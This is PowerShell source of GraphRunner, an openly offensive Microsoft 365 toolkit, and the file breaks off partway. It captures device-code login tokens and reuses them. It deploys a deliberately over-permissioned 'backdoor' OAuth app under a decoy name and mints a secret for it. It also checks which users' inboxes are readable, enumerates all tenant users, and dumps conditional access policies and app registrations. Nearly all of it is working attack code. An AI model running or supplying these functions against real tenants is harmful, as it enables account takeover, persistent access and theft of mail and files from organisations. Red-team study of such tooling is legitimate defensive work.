Write-Host -ForegroundColor green "
  ________                     __      _______      by Beau Bullock (@dafthack)                                
 /_______/___________  ______ |  |____/_______\__ __  ____   ____   ___________ 
/___\  __\______\____\ \_____\|__|__\|________/__|__\/____\ /____\_/____\______\
\    \_\  \  | \// __ \|  |_/ |   Y  \    |   \  |  /   |  \   |  \  ___/|  | \/
 \________/__|  (______/__|   |___|__|____|___/____/|___|__/___|__/\___| >__|   
                 Do service principals dream of electric sheep?
                       
For usage information see the wiki here: https://github.com/dafthack/GraphRunner/wiki
"


function Get-GraphTokens{
    
    Write-Host -ForegroundColor yellow "[*] Initiating a device code login."

    $body = @{
        "client_id" =     "d3590ed6-52b3-4102-aeff-aad2292ab01c"
        "resource" =      "https://graph.microsoft.com"
    }
    $UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
    $Headers=@{}
    $Headers["User-Agent"] = $UserAgent
    $authResponse = Invoke-RestMethod `
        -UseBasicParsing `
        -Method Post `
        -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" `
        -Headers $Headers `
        -Body $body
    Write-Host -ForegroundColor yellow $authResponse.Message

    $continue = "authorization_pending"
    while($continue)
            {
    
        $body=@{
            "client_id" =  "d3590ed6-52b3-4102-aeff-aad2292ab01c"
            "grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
            "code" =       $authResponse.device_code
            "scope" = "openid"
        }
        try{
        $global:tokens = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0" -Headers $Headers -Body $body
        }
        catch{
        $details=$_.ErrorDetails.Message | ConvertFrom-Json
        $continue = $details.error -eq "authorization_pending"
        Write-Output $details.error
        }
        if($tokens)
            {
                
                $tokenPayload = $tokens.access_token.Split(".")[1].Replace('-', '+').Replace('_', '/')
                while ($tokenPayload.Length % 4) { Write-Verbose "Invalid length for a Base-64 char array or string, adding ="; $tokenPayload += "=" }
                $tokenByteArray = [System.Convert]::FromBase64String($tokenPayload)
                $tokenArray = [System.Text.Encoding]::ASCII.GetString($tokenByteArray)
                $tokobj = $tokenArray | ConvertFrom-Json
                $global:tenantid = $tokobj.tid
                Write-host "Decoded JWT payload:"
                $tokobj
                Write-Host -ForegroundColor Green '[*] Successful authentication. Access and refresh tokens have been written to the global $tokens variable. To use them with other GraphRunner modules use the Tokens flag (Example. Invoke-DumpApps -Tokens $tokens)'
                break
            }
        Start-Sleep -Seconds 3
    }
}

function Refresh-GraphTokens{
    
    if(!$tokens){
        write-host -ForegroundColor red '[*] No tokens found in the $tokens variable. Use the Get-GraphTokens module to authenticate first.'
    break
    }
    Write-Host -ForegroundColor yellow "[*] Refreshing Tokens..."
    $authUrl = "https://login.microsoftonline.com/$tenantid"
    $refreshbody = @{
            "resource" = "https://graph.microsoft.com/"
            "client_id" =     "d3590ed6-52b3-4102-aeff-aad2292ab01c"
            "grant_type" =    "refresh_token"
            "refresh_token" = $tokens.refresh_token
            "scope"=         "openid"
        }

    try{
    $reftokens = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "$($authUrl)/oauth2/token" -Headers $Headers -Body $refreshbody
    }
    catch{
    $details=$_.ErrorDetails.Message | ConvertFrom-Json
    Write-Output $details.error
    } 
    if($reftokens)
            {
                $global:tokens = $reftokens
                $tokenPayload = $tokens.access_token.Split(".")[1].Replace('-', '+').Replace('_', '/')
                while ($tokenPayload.Length % 4) { Write-Verbose "Invalid length for a Base-64 char array or string, adding ="; $tokenPayload += "=" }
                $tokenByteArray = [System.Convert]::FromBase64String($tokenPayload)
                $tokenArray = [System.Text.Encoding]::ASCII.GetString($tokenByteArray)
                $tokobj = $tokenArray | ConvertFrom-Json
                $global:tenantid = $tokobj.tid
                Write-host "Decoded JWT payload:"
                $tokobj
                Write-Host -ForegroundColor Green '[*] Successful authentication. Access and refresh tokens have been written to the global $tokens variable. To use them with other GraphRunner modules use the Tokens flag (Example. Invoke-DumpApps -Tokens $tokens)'
                break
            }
}

function Inject-OAuthApp{


<#
    .SYNOPSIS
        This is a CLI tool for automating the deployment of an app registration to a Microsoft Azure tenant. In the event that the Azure portal is locked down this may provide an additional mechanism for app deployment, provided that user's are allowed to register apps in the tenant.
        Author: Beau Bullock (@dafthack)
        License: MIT
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION
        
       This is a CLI tool for automating the deployment of an app registration to a Microsoft Azure tenant. In the event that the Azure portal is locked down this may provide an additional mechanism for app deployment, provided that user's are allowed to register apps in the tenant.        
    
    .PARAMETER AppName
        
        The display name of the App Registration. This is what will be displayed on the consent page.
    
    
    .PARAMETER ReplyUrl
        
        The reply URL to redirect a user to after app consent. This is where you will want to capture the OAuth code and complete the flow to obtain an access token and refresh token.
    
    .PARAMETER Scope
        
        Delegated Microsoft Graph permissions to scope to the app. Example: Mail.Read, User.ReadBasic.All, etc. Scope items need to be comma separated with each item in double quotes like this (-scope "Mail.Read","openid","email","profile","offline_access")
    
     .PARAMETER Tokens
        
        Provide an already authenticated access token. 

    .EXAMPLE
        
        C:\PS> Inject-OAuthApp -AppName "Win Defend for M365" -ReplyUrl "https://windefend.azurewebsites.net" -scope "openid","Mail.Read","email","profile","offline_access"
        Description
        -----------
        This command will inject an app registration with the display name of "Win Defend for M365" with a scope of openid, Mail.Read, email, profile, and offline_access
    
    .EXAMPLE
        
        C:\PS> Inject-OAuthApp -AppName "Not a Backdoor" -ReplyUrl "https://windefend.azurewebsites.net" -scope "op backdoor" -AccessToken "eyJ0eXAiOiJKV..."
        Description
        -----------
        This command takes an already authenticated access token gathered from something like a device code login. It uses the hardcoded value of "op backdoor" as the scope to add a large number of permissions to the app registration. None of these permissions require admin consent. 
#>
  Param(


    [Parameter(Position = 0, Mandatory = $True)]
    [string]
    $AppName = "",

    [Parameter(Position = 1, Mandatory = $True)]
    [string]
    $ReplyUrl = "",

    [Parameter(Position = 2, Mandatory = $True)]
    [string[]]
    $Scope,
    
    [Parameter(Position = 3, Mandatory = $False)]
    [object[]]
    $Tokens
  )
if($Tokens){
    Write-Host -ForegroundColor yellow "[*] Using the provided access tokens."
    $access_token = $tokens.access_token

}
else{
    # Login
    Write-Host -ForegroundColor yellow "[*] First, you need to login as the user you want to deploy the app as."

    $body = @{
        "client_id" =     "d3590ed6-52b3-4102-aeff-aad2292ab01c"
        "resource" =      "https://graph.microsoft.com"
    }
    $UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
    $Headers=@{}
    $Headers["User-Agent"] = $UserAgent
    $authResponse = Invoke-RestMethod `
        -UseBasicParsing `
        -Method Post `
        -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" `
        -Headers $Headers `
        -Body $body
    Write-Host -ForegroundColor yellow $authResponse.Message

    $continue = "authorization_pending"
    while($continue)
            {
    
        $body=@{
            "client_id" =  "d3590ed6-52b3-4102-aeff-aad2292ab01c"
            "grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
            "code" =       $authResponse.device_code
        }
        try{
        $global:tokens = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0" -Headers $Headers -Body $body
        }
        catch{
        $details=$_.ErrorDetails.Message | ConvertFrom-Json
        $continue = $details.error -eq "authorization_pending"
        Write-Output $details.error
        }
        if($tokens)
            {
                write-host -ForegroundColor yellow '[*] Successful Auth! Access and refresh tokens are accessible in the $tokens variable.'
                $access_token = $tokens.access_token
                break
            }
        Start-Sleep -Seconds 3
    }    

}
$Headers = @{
    Authorization = "Bearer $access_token"
}

# Get Microsoft Graph Object ID
Write-Host -ForegroundColor yellow "[*] Getting Microsoft Graph Object ID"


# Get full service principal list

$initialUrl = "https://graph.microsoft.com/v1.0/servicePrincipals"
$headers = @{"Authorization" = "Bearer $access_token"}

# Initialize an array to store all collected data
$allData = @()

# Loop until there's no more nextLink
do {
    # Invoke the web request
    $response = Invoke-WebRequest -Uri $initialUrl -Headers $headers

    # Convert the response content to JSON
    $jsonData = $response.Content | ConvertFrom-Json

    # Add the current page's data to the array
    $allData += $jsonData.value

    # Check if there's a nextLink
    if ($jsonData.'@odata.nextLink') {
        $initialUrl = $jsonData.'@odata.nextLink'
    } else {
       
        break
    }
} while ($true)

$appDisplayNameToSearch = "Microsoft Graph"
$graphId = $allData | Where-Object { $_.appDisplayName -eq $appDisplayNameToSearch } | Select-Object -ExpandProperty appId
$graphIdInternal = $allData | Where-Object { $_.appDisplayName -eq $appDisplayNameToSearch } | Select-Object -ExpandProperty Id
Write-Output "Graph ID: $graphId"
Write-Output "Internal Graph ID: $graphIdInternal"

# Get Object IDs of individual permissions
Write-Host -ForegroundColor yellow "[*] Now getting object IDs for scope objects:"
$spns = Invoke-WebRequest -Uri "https://graph.microsoft.com/v1.0/servicePrincipals/$graphIdInternal" -Headers $headers
$spnsjson = $spns.Content | ConvertFrom-Json

if ($Scope -like "op backdoor")
{
    $Scope = "openid","profile","offline_access","email","User.Read","User.ReadBasic.All","Mail.Read","Mail.Send","Mail.Read.Shared","Mail.Send.Shared","Files.ReadWrite.All","EWS.AccessAsUser.All","ChatMessage.Read","ChatMessage.Send","Chat.ReadWrite","Chat.Create","ChannelMessage.Edit","ChannelMessage.Send","Channel.ReadBasic.All","Presence.Read.All","Team.ReadBasic.All","Team.Create","Sites.Manage.All","Sites.Read.All","Sites.ReadWrite.All","Policy.Read.ConditionalAccess"
    Write-Host -ForegroundColor yellow "[*] One overpowered (OP) backdoor is coming right up! Here is the scope:"
}
$scopeurl = ""
$accesslist = ""
$scopeIds = @{}
$joinedScope = $Scope -join " "
$joinedScope

# Loop through each item in $Scope
foreach ($item in $Scope){
    $variableName = $item -replace "[\W\d]", ""  # Remove non-alphanumeric characters and digits
    $variableName = $variableName + "Scope"
    

    $scopeItem = $spnsjson.oauth2PermissionScopes | Where-Object { $_.value -eq "$item" } |select-object id
    $scopeId = ('"' + $scopeItem.Id +'"')
    if (!$scopeId){Write-host -foregroundcolor red "[**] Couldn't find scope option $item"}
    else{
    Write-Host ($item + " : " + $scopeId)
    $scopeurl += "$item%20"
    $accesslist += '{"id": ' + $scopeId + ',"type": "Scope"},'
    
    # Store the scope ID in the hashtable
    $scopeIds[$variableName] = $scopeId
    }
}

Write-Host -ForegroundColor yellow "[*] Finished collecting object IDs of permissions."
# Create a resources variable
$permissions = $accesslist.Trim(",")

$resources = @"
{"resourceAppId": "$graphId", "resourceAccess": [$permissions]}
"@

# Create the app in the tenant
Write-host -ForegroundColor yellow "[*] Now deploying the app registration with display name $AppName to the tenant."

$resourceAccess = $resources | ConvertFrom-Json

# Construct the JSON body
$jsonBody = @{
    displayName         = $AppName
    signInAudience      = "AzureADMultipleOrgs"
    keyCredentials      = @()
    web                 = @{
        redirectUris = @($ReplyUrl)
    }
    requiredResourceAccess = @(
        @{
            resourceAppId   = $resourceAccess.resourceAppId
            resourceAccess = $resourceAccess.resourceAccess
        }
    )
}

# Convert the JSON body to a properly formatted JSON string
$finalJson = $jsonBody | ConvertTo-Json -Depth 10

$appcreationheaders = @{
    Authorization = "Bearer $access_token"
    "Content-Type" = "application/json"
    "Accept-Encoding" = "gzip, deflate"
}


$appresponse = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/applications" -Headers $appcreationheaders  -Method Post -Body $finaljson

if (!$appresponse){
    Write-host -ForegroundColor red "[*] An error occurred during deployment."
    break
}

$currentTime = Get-Date -Format "yyyy-MM-ddTHH:mm:ssZ"
$oneYearLater = (Get-Date).AddYears(1).ToString("yyyy-MM-ddTHH:mm:ssZ")
$secretCredential = @{
    passwordCredential = @{
        displayName = $null
        endDateTime = $oneYearLater
        startDateTime = $currentTime
    }
}
$SecretBody = $secretCredential | ConvertTo-Json
$applicationid = $appresponse.id
$secretrequest = Invoke-WebRequest -Headers $Headers -Method POST -ContentType "application/json" -Body $SecretBody -Uri "https://graph.microsoft.com/v1.0/applications/$applicationid/addPassword"

$secretdata = $secretrequest.Content |ConvertFrom-json

# Generate the Consent URL
Write-host -ForegroundColor yellow "[*] If everything worked successfully this is the consent URL you can use to grant consent to the app:"
$consentURL = "https://login.microsoftonline.com/organizations/oauth2/v2.0/authorize?client_id=" + $appresponse.AppId + "&response_type=code&redirect_uri=
" + [System.Web.HttpUtility]::UrlEncode($ReplyUrl) + "&response_mode=query&scope=" + $scopeurl.Trim("%20") + "&state=1234"
Write-Host "--------------------------------------------------------"
Write-Host -ForegroundColor green $consentURL
Write-Host "--------------------------------------------------------"
Write-Host ("Application ID: " + $appresponse.AppId)

Write-Host ("Secret: " + $Secretdata.secretText)
Write-Host "--------------------------------------------------------"

if($ReplyUrl -match "localhost" -or $ReplyUrl -match "127.0.0.1"){
Write-Host "Localhost detected in Reply URL field. You can use the Invoke-AutoOAuthFlow module to complete the OAuth flow automatically."
Write-Host "--------------------------------------------------------"
$scopeclean = ('"' + $scopeurl.replace('%20', ' ').Trim(" ") + '"')
Write-Host -ForegroundColor Cyan ('Invoke-AutoOAuthFlow -ClientId "' + $appresponse.AppId + '" -ClientSecret "' + $Secretdata.secretText + '" -RedirectUri "' + $ReplyURL + '" -scope ' + $scopeclean)
}
else{
Write-Host "After you obtain an OAuth Code from the redirect URI server you can use this command to complete the flow:"
Write-Host "--------------------------------------------------------"
$scopeclean = ('"' + $scopeurl.replace('%20', ' ').Trim(" ") + '"')
Write-Host -ForegroundColor Cyan ('Get-AzureAppTokens -ClientId "' + $appresponse.AppId + '" -ClientSecret "' + $Secretdata.secretText + '" -RedirectUri "' + $ReplyURL + '" -scope ' + $scopeclean + " -AuthCode <insert your OAuth Code here>")
}
}


Function Invoke-GraphOpenInboxFinder{
    param(
    [Parameter(Position = 0, Mandatory = $true)]
    [object[]]
    $Tokens = "",
    [Parameter(Position = 0, Mandatory = $true)]
    [string]
    $userlist = ""
    )

    $Mailboxes = @(Get-Content -Path $userlist)
    $count = $Mailboxes.count
    $curr_mbx = 0

    $access_token = $tokens.access_token

    Write-Output "`n`r"
    Write-Output "[*] Checking access to mailboxes for each email address..."
    Write-Output "`n`r"
    foreach($mbx in $Mailboxes)
    {
        $request = ""
        Write-Host -nonewline "$curr_mbx of $count mailboxes checked`r"
        $curr_mbx += 1
        try { $request = Invoke-WebRequest -Method GET -Uri "https://graph.microsoft.com/v1.0/users/$mbx/mailFolders/Inbox/messages" -Headers @{"Authorization" = "Bearer $access_token"} 
        }catch{
            $err = $_.Exception.Response.StatusCode.Value__
        }
    
        If ($request.StatusCode -eq 200){
            Write-Host -ForegroundColor Green "[*] SUCCESS! Inbox of $mbx is readable."
            $out = $request.Content | ConvertFrom-Json
            Write-Host ("Latest Email Received " + $out.value.createdDateTime + " with subject: " + $out.value.subject)
        }
    }
}

## A few tools for working with Azure OAuth2 Authentication Codes and access_tokens for Azure App Registrations
## By Beau Bullock @dafthack

Function Get-AzureAppTokens{

Param
(
    [Parameter(Position = 0, Mandatory = $true)]
    [string]
    $Scope = "",

    [Parameter(Position = 1, Mandatory = $true)]
    [string]
    $ClientID = "",

    [Parameter(Position = 2, Mandatory = $true)]
    [string]
    $ClientSecret = "",

    [Parameter(Position = 3, Mandatory = $true)]
    [string]
    $RedirectUri = "",

    [Parameter(Position = 4, Mandatory = $true)]
    [string]
    $AuthCode = ""
)

$body = @{client_id=$ClientID
scope=$Scope
code=$AuthCode
redirect_uri=$RedirectUri
grant_type="authorization_code"
client_secret=$ClientSecret
}

        try{
        $request = Invoke-WebRequest -Method POST -ContentType "application/x-www-form-urlencoded" -Uri "https://login.microsoftonline.com/common/oauth2/v2.0/token" -Body $body
        }
        catch{
        $details=$_.ErrorDetails.Message | ConvertFrom-Json
        $continue = $details.error -eq "authorization_pending"
        Write-Output $details.error
        }
        if($request)
            {
                $global:apptokens = $request.Content | ConvertFrom-Json
                Write-Output "---Here is your access token---"
                $apptokens.access_token
                Write-Output "---Here is your refresh token---"
                $apptokens.refresh_token
                Write-Host -ForegroundColor Green '[*] Successful authentication. Access and refresh tokens have been written to the global $apptokens variable. To use them with other GraphRunner modules use the Tokens flag (Example. Invoke-DumpApps -Tokens $apptokens)'
            }
}

Function Check-MSGraphAccess{
    param(
    [Parameter(Position = 0, Mandatory = $true)]
    [object[]]
    $Tokens = ""
    )
    $access_token = $tokens.access_token
$request = Invoke-WebRequest -Method GET -Uri "https://graph.microsoft.com/v1.0/me" -Headers @{"Authorization" = "Bearer $access_token"}
$out = $request.Content | ConvertFrom-Json
$out
}

Function Refresh-AzureAppTokens{
Param
(
    [Parameter(Position = 0, Mandatory = $false)]
    [string]
    $Scope = "openid offline_access email user.read profile",

    [Parameter(Position = 1, Mandatory = $true)]
    [string]
    $ClientID = "",

    [Parameter(Position = 2, Mandatory = $true)]
    [string]
    $ClientSecret = "",

    [Parameter(Position = 3, Mandatory = $true)]
    [string]
    $RedirectUri = "",

    [Parameter(Position = 4, Mandatory = $true)]
    [string]
    $RefreshToken = ""
)

$body = @{client_id=$ClientID
scope=$Scope
refresh_token=$RefreshToken
redirect_uri=$RedirectUri
grant_type="refresh_token"
client_secret=$ClientSecret
}

$request = Invoke-WebRequest -Method POST -ContentType "application/x-www-form-urlencoded" -Uri "https://login.microsoftonline.com/common/oauth2/v2.0/token" -Body $body
$global:apptokens = $request.Content | ConvertFrom-Json
Write-Output "---Here is your access token---"
$parsed.access_token
Write-Output "---Here is your refresh token---"
$parsed.refresh_token

}


Function Invoke-AutoOAuthFlow{
Param
(
    [Parameter(Position = 0, Mandatory = $true)]
    [string]
    $Scope = "",

    [Parameter(Position = 1, Mandatory = $true)]
    [string]
    $ClientID = "",

    [Parameter(Position = 2, Mandatory = $true)]
    [string]
    $ClientSecret = "",

    [Parameter(Position = 3, Mandatory = $true)]
    [string]
    $RedirectUri = ""
)
Add-Type -AssemblyName System.Web

$listener = New-Object System.Net.HttpListener
$listener.Prefixes.Add("http://localhost:10000/")
$listener.Start()

Write-Host "Listening for incoming requests on http://localhost:10000/"

$context = $listener.GetContext() # This blocks until a request is received
$request = $context.Request
$response = $context.Response

# Capture the OAuth code from the query parameters
$queryParams = [System.Web.HttpUtility]::ParseQueryString($request.Url.Query)
$oauthCode = $queryParams["code"]

# You can now process the OAuth code as needed
Write-Host "Captured OAuth code: $oauthCode"

# Respond to the client
$responseText = "OAuth code captured successfully."
$responseBytes = [System.Text.Encoding]::UTF8.GetBytes($responseText)
$response.OutputStream.Write($responseBytes, 0, $responseBytes.Length)
$response.Close()

$listener.Stop()

Get-AzureAppTokens -ClientId $ClientID -ClientSecret $ClientSecret -RedirectUri $RedirectUri -scope $Scope -AuthCode $oauthCode

}

Function Get-Inbox{
    param(
    [Parameter(Position = 0, Mandatory = $true)]
    [object[]]
    $Tokens = "",
    [Parameter(Position = 0, Mandatory = $true)]
    [string]
    $userid = ""
    )

    $access_token = $Tokens.access_token

$request = Invoke-WebRequest -Method GET -Uri "https://graph.microsoft.com/v1.0/users/$userid/mailFolders/Inbox/messages" -Headers @{"Authorization" = "Bearer $access_token"}
$out = $request.Content | ConvertFrom-Json

$out.value


}


Function Get-AzureADUsers{
    param(
    [Parameter(Position = 0, Mandatory = $true)]
    [object[]]
    $Tokens = "",
    [Parameter(Position = 1, Mandatory = $true)]
    [string]
    $outfile = ""
    )
    $access_token = $tokens.access_token

    Write-Host "[*] Gathering the users from the tenant."
    $usersEndpoint = "https://graph.microsoft.com/v1.0/users"
    $userlist = @()
    do{
        $request = Invoke-WebRequest -Method GET -Uri $usersEndpoint -Headers @{"Authorization" = "Bearer $access_token"}
        $out = $request.Content | ConvertFrom-Json
        $userlist += $out.value.userPrincipalName 
        if ($out.'@odata.nextLink') {
            Write-Host "[*] Gathering more users..."
            $usersEndpoint = $out.'@odata.nextLink'
        }
        else {
            # No more pages, exit loop
            break
        }
    } while ($true)

Write-Output "---All Azure AD User Principal Names---"
$userlist
Write-Host -ForegroundColor green ("Discovered " + $userlist.count + " users")
$userlist | Out-File -Encoding ASCII $outfile
}



Function Invoke-DumpCAPS{
<#
    .SYNOPSIS
        Tool for dumping conditional access policies
        Author: Beau Bullock (@dafthack)
        License: MIT
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION
        
       Tool for dumping conditional access policies       
    
    .PARAMETER Tokens
        
        Token object for auth
    
    .PARAMETER ResolveGuids
        
        Switch to resolve user and group guids if wanted

    .EXAMPLE
        
        C:\PS> Invoke-DumpCAPS -ResolveGuids
        Description
        -----------
        This command will dump conditional access policies from the tenant and resolve user and group guids.


    .EXAMPLE

        C:\PS> Invoke-DumpCAPS -Tokens $tokens -ResolveGuids
        Description
        -----------
        Use a previously authenticated refresh token to dump CAPS
    
#>


    Param(


    [Parameter(Position = 0, Mandatory = $False)]
    [switch]
    $ResolveGuids,

    [Parameter(Position = 1, Mandatory = $False)]
    [object[]]
    $Tokens = ""

  )

  if($Tokens){
        Write-Host -ForegroundColor yellow "[*] Using the provided access tokens."
        Write-Host -ForegroundColor Yellow "[*] Refreshing token to the Azure AD Graph API..."
        $RefreshToken = $tokens.refresh_token
        $authUrl = "https://login.microsoftonline.com/$tenantid"
        $refreshbody = @{
                "resource" = "https://graph.windows.net/"
                "client_id" =     "04b07795-8ddb-461a-bbee-02f9e1bf7b46"
                "grant_type" =    "refresh_token"
                "refresh_token" = $RefreshToken
                "scope"=         "openid"
            }

    try{
    $reftokens = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "$($authUrl)/oauth2/token" -Headers $Headers -Body $refreshbody
    }
    catch{
    $details=$_.ErrorDetails.Message | ConvertFrom-Json
    Write-Output $details.error
    }
    if($reftokens)
            {
               $aadtokens = $reftokens
               $access_token = $aadtokens.access_token
            }
  }
  else{
        # Login
        Write-Host -ForegroundColor yellow "[*] Initiating a device code login."

        $body = @{
            "client_id" =     "04b07795-8ddb-461a-bbee-02f9e1bf7b46"
            "resource" =      "https://graph.windows.net/"
        }
        $UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
        $Headers=@{}
        $Headers["User-Agent"] = $UserAgent
        $authResponse = Invoke-RestMethod `
            -UseBasicParsing `
            -Method Post `
            -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" `
            -Headers $Headers `
            -Body $body
        Write-Host -ForegroundColor yellow $authResponse.Message

        $continue = "authorization_pending"
        while($continue)
                {
    
            $body=@{
                "client_id" =  "04b07795-8ddb-461a-bbee-02f9e1bf7b46"
                "grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
                "code" =       $authResponse.device_code
            }
            try{
            $aadtokens = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0" -Headers $Headers -Body $body
            }
            catch{
            $details=$_.ErrorDetails.Message | ConvertFrom-Json
            $continue = $details.error -eq "authorization_pending"
            Write-Output $details.error
            }
            if($aadtokens)
                {
                    $access_token = $aadtokens.access_token
                    break
                }
            Start-Sleep -Seconds 3
        }   
    }

    $tokenPayload = $aadtokens.access_token.Split(".")[1].Replace('-', '+').Replace('_', '/')
    while ($tokenPayload.Length % 4) { Write-Verbose "Invalid length for a Base-64 char array or string, adding ="; $tokenPayload += "=" }
    $tokenByteArray = [System.Convert]::FromBase64String($tokenPayload)
    $tokenArray = [System.Text.Encoding]::ASCII.GetString($tokenByteArray)
    $tokobj = $tokenArray | ConvertFrom-Json
    $tenantid = $tokobj.tid


    $HeadersAuth = @{
        Authorization = "Bearer $access_token"
    }

    $CAPSUrl = "https://graph.windows.net/$tenantid/policies?api-version=1.61-internal"
    $CAPS = Invoke-RestMethod -Method GET -Uri $CAPSUrl -Headers $HeadersAuth
    $parsedjson = $CAPS 

    Write-Host -ForegroundColor Yellow "[*] Now dumping conditional access policies from the tenant."
    # Iterate through each policy object and print the details
    foreach ($policy in $parsedJson.value) {
        $policyType = $policy.policyType
        $displayName = $policy.displayName
        $policyDetail = $policy.policyDetail | ConvertFrom-Json
        if ($policyType -eq "18"){
            # Process the PolicyDetail field
            $policyState = $policyDetail.State
            $conditionspreformat = $policyDetail.Conditions 
            $controls = $policyDetail.Controls.Control -join ", "

            # Print the policy details
            # If the policy is disabled print in gray
            if ($policyState -eq "Disabled") {
                Write-Host -ForegroundColor DarkGray "Display Name: $displayName"
                Write-Host -ForegroundColor DarkGray  "Policy Type: $policyType"
                Write-Host -ForegroundColor Red "Policy State: $policyState"
                Write-Host -ForegroundColor DarkGray  "Conditions:`n"
                $formattedConditions = @()

                foreach ($condition in $conditionspreformat.PSObject.Properties) {
                    $conditionType = $condition.Name
                    $conditionData = $condition.Value

                    $conditionText = ""

                    foreach ($includeExclude in @("Include", "Exclude")) {
                        if ($conditionData.$includeExclude) {
                            $conditionValues = @()

                            foreach ($includeData in $conditionData.$includeExclude) {
                                $includeType = $includeData.PSObject.Properties.Name
                                $includeValues = $includeData.PSObject.Properties.Value -split ', '  
                                $resolvedUsers = @()
                                if($ResolveGuids){
                                    foreach ($guid in $includeValues) {
                                        if ($guid -match '^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$') {
                                            $resolvedUser = ResolveGUID $guid $HeadersAuth
                                            $resolvedUsers += $resolvedUser
                                        } else {
                                            $resolvedUsers += $guid
                                        }
                                    }
                                }
                                else{
                                    foreach ($guid in $includeValues) {
                                        $resolvedUsers += $guid
                                    }
                                }
                                $includeValue = "$($resolvedUsers -join ', ')"
                                $conditionValues += "`t`t`t$includeType : $includeValue"
                            }

                            if ($conditionValues.Count -gt 0) {
                                $conditionText += "`t`t$includeExclude :`n$($conditionValues -join "`n")`n"
                            }
                        }
                    }

                    $formattedCondition = "`t$conditionType :`n$conditionText"
                    Write-Host -ForegroundColor DarkGray $formattedCondition
                }
                Write-Host -ForegroundColor DarkGray  "Controls: $controls"
            } else {
                Write-Host "Display Name: $displayName"
                Write-Host "Policy Type: $policyType"
                Write-Host "Policy State: $policyState"
                Write-Host "Conditions:`n"
                $formattedConditions = @()

                foreach ($condition in $conditionspreformat.PSObject.Properties) {
                    $conditionType = $condition.Name
                    $conditionData = $condition.Value

                    $conditionText = ""

                    foreach ($includeExclude in @("Include", "Exclude")) {
                        if ($conditionData.$includeExclude) {
                            $conditionValues = @()

                            foreach ($includeData in $conditionData.$includeExclude) {
                                $includeType = $includeData.PSObject.Properties.Name
                                $includeValues = $includeData.PSObject.Properties.Value -split ', '  
                                $resolvedUsers = @()
                                if($ResolveGuids){
                                    foreach ($guid in $includeValues) {
                                        if ($guid -match '^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$') {
                                            $resolvedUser = ResolveGUID $guid $HeadersAuth
                                            $resolvedUsers += $resolvedUser
                                        } else {
                                            $resolvedUsers += $guid
                                        }
                                    }
                                }
                                else{
                                    foreach ($guid in $includeValues) {
                                        $resolvedUsers += $guid
                                    }
                                }
                                $includeValue = "$($resolvedUsers -join ', ')"
                                $conditionValues += "`t`t`t$includeType : $includeValue"
                            }

                            if ($conditionValues.Count -gt 0) {
                                $conditionText += "`t`t$includeExclude :`n$($conditionValues -join "`n")`n"
                            }
                        }
                    }

                    $formattedCondition = "`t$conditionType :`n$conditionText"
                    $formattedCondition
                }
    
                Write-Host "Controls: $controls"
            }
            # Separator
            Write-Host ("=" * 80) 
        }
    }
}



function ResolveGUID($guid,$HeadersAuth) {
        $url = "https://graph.windows.net/$tenantid/directoryObjects/$guid/?api-version=1.61-internal"
        try{
        $resolvedObject = Invoke-RestMethod -Method Get -Uri $url -Headers $HeadersAuth -ErrorAction Stop
        } catch {
        return "Unresolved: $guid"
        continue
        }
        if ($resolvedObject.objectType -eq "User") {
            return "$($resolvedObject.userPrincipalName)"
        } elseif ($resolvedObject.objectType -eq "Group") {
            return "$($resolvedObject.displayName)"
        } else {
            return "Unresolved: $guid"
        }
    }



Function Invoke-DumpApps{
<#
    .SYNOPSIS
        Dump all of the app registrations and external enterprise apps as well as list members that have consented to permissions on their accounts.
        Author: Beau Bullock (@dafthack)
        License: MIT
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION
        
       Dump all of the app registrations and external enterprise apps as well as list members that have consented to permissions on their accounts.

    .EXAMPLES      
        
        C:\PS> Invoke-DumpApps -Tokens $tokens
#>

Param(

    [Parameter(Position = 0, Mandatory = $False)]
    [object[]]
    $Tokens = ""

  )

if($Tokens){
    Write-Host -ForegroundColor yellow "[*] Using the provided access tokens."
    $accesstoken = $tokens.access_token
    $refreshtoken = $tokens.refresh_token
}
else{

    Write-Host -ForegroundColor yellow "[*] Initiating a device code login"

    $body = @{
        "client_id" =     "d3590ed6-52b3-4102-aeff-aad2292ab01c"
        "resource" =      "https://graph.microsoft.com"
    }
    $UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
    $Headers=@{}
    $Headers["User-Agent"] = $UserAgent
    $authResponse = Invoke-RestMethod `
        -UseBasicParsing `
        -Method Post `
        -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" `
        -Headers $Headers `
        -Body $body
    Write-Host -ForegroundColor yellow $authResponse.Message

    $continue = "authorization_pending"
    while($continue)
            {
    
        $body=@{
            "client_id" =  "d3590ed6-52b3-4102-aeff-aad2292ab01c"
